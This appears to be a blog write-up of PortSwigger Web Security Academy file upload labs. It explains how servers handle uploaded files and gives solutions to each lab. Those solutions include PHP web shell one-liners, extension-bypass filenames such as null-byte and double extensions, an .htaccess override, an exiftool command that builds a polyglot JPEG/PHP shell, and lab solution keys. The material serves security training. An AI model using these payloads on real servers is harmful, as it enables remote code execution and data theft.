---
date: 2025-04-21
linktitle: file_upload
title: File Upload Vulnerabilities
showreadingtime: true
tags: ['PortSwigger']
categories: ['PortSwigger', 'Server-side']
---

## How do web servers handle requests for static files?

The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.

- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.
## **What can be achieved with different extensions**

1. Webshell as well as Remote Code execution can be achieved by uploading ASP / ASPX / PHP5 / PHP / PHP
2. Stored Cross-site Scripting, SSRF can be achieved by uploading SVG file
3. CSV INJECTION can be achieved by uploading CSV files
4. XXE can be achieved by uploading XML and SVG files
5. LFI as well as SSRF can be achieved through AVI files
6. HTML INJECTION, XSS and OPEN REDIRECT can achieve by uploading HTML &JS files
7. PIXEL FLOOD ATTACK can happen by uploading PNG or JPEG file
8. RCE VIA LFI can be achieved by uploading ZIP file
9. SSRF and BLIND XXE can be done by uploading PDF/PPTX
#### Tip

The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

### Lab 1: Remote code execution via web shell upload
```
https://0a800097043b23e0830e73e400b200fb.web-security-academy.net/files/avatars/payload.php?cmd=cat+%2Fhome%2Fcarlos%2Fsecret
```
Key: 
`RJMFxxYYHLvH1PB45V3EhyJnNbhbs9EV`

## Flawed file type validation

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

```

POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.

### Lab 2:  Web shell upload via Content-Type restriction bypass
Modify this on the previous used payload: 
`Content-Type: image/png or image/jpeg`

Key:
`tGsD08FqiLMvyfmL1dnIlleECmGwKaAD`

## Preventing file execution in user-accessible directories

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

`GET /static/exploit.php?command=id HTTP/1.1 Host: normal-website.com HTTP/1.1 200 OK Content-Type: text/plain Content-Length: 39 <?php echo system($_GET['command']); ?>`

This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

#### Tip

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently.

### Lab 3: Web shell upload via path traversal
Modify the content disposition as in the screenshot.  
![image](/assets/img/portswigger/Pasted image 20250311231740.png)

Then the key is at this URL : `https://0ade008604bb7d608183f78900dd0029.web-security-academy.net/files/avatars/../payload.php?cmd=cat+/home/carlos/secret`

Key:
`4ePTQbnicQnKs0EjyJmlkeVrgaaP9Nty`

## Overriding the server configuration [!Expert]

***As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so.*** For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

`LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php`

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:

`<staticContent> <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>`

Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

### Lab 4: Web shell upload via extension blacklist bypass [!Expert]
1. In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:
    - Change the value of the `filename` parameter to `.htaccess`.
    - Change the value of the `Content-Type` header to `text/plain`.
    - Replace the contents of the file (your PHP payload) with the following Apache directive:
        
        `AddType application/x-httpd-php .l33t`
        
        This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
        
2. Send the request and observe that the file was successfully uploaded.
3. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
4. Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully.
5. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.

Key:
`QUxv92HTJ0KfxNecCrfz0x9aNFFOpfWL`

## Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:

- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

`exploit.p.phphp`

This is just a small selection of the many ways it's possible to obfuscate file extensions.

### Lab 5: Web shell upload via obfuscated file extension
`filename="payload.php%00.png"`
`Content-Type: image/png`

URL : `https://0a97002703ec6c478b9c3657007800e6.web-security-academy.net/files/avatars/payload.php?cmd=ca%74%20%2fhome/carlos/secret`
Key:
`ftn7ocEWfQqE5YoLbyz3b1r8PpzEGDlk`

## Flawed validation of the file's contents

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

### Lab 6: Remote code execution via polyglot web shell upload [!Expert]

1. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
    
    `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
    
    This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.
    
4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
5. In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:
    
    `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`
6. Submit the secret to solve the lab.

![image](/assets/img/portswigger/Pasted image 20250421194459.png)

`Key: 0sAd5OlvpX8afwLxtB2k8AzFBixMcaDu`

## Exploiting file upload race conditions
Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.
## Race conditions in URL-based file uploads
Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.

As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.

For example, if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced.

To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.

## Exploiting file upload vulnerabilities without remote code execution

In the examples we've looked at so far, we've been able to upload server-side scripts for remote code execution. This is the most serious consequence of an insecure file upload function, but these vulnerabilities can still be exploited in other ways.
## Uploading malicious client-side scripts

Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create stored XSS payloads.

If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.

## Exploiting vulnerabilities in the parsing of uploaded files

If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks.

## Uploading files using PUT

It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

```
PUT /images/exploit.php HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-httpd-php Content-Length: 49 <?php echo file_get_contents('/path/to/file'); ?>
```
#### Tip

You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.
# Cheatsheet:
1. PDF Upload Vulnerbility:
	1. [Hacking With PDF](https://0xcybery.github.io/blog/hacking-with-pdf)
	2. [PDF Insecurity Website](https://www.pdf-insecurity.org/pdf-dangerous-paths/attacks.html)
2. File upload vuln - Approach:
	1. https://cognisys.co.uk/blog/file-upload-vulnerabilities/
	2. https://www.yeswehack.com/learn-bug-bounty/file-upload-attacks-part-2
3. Payload for all sorts of uploads:
	1. [Payload of All things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
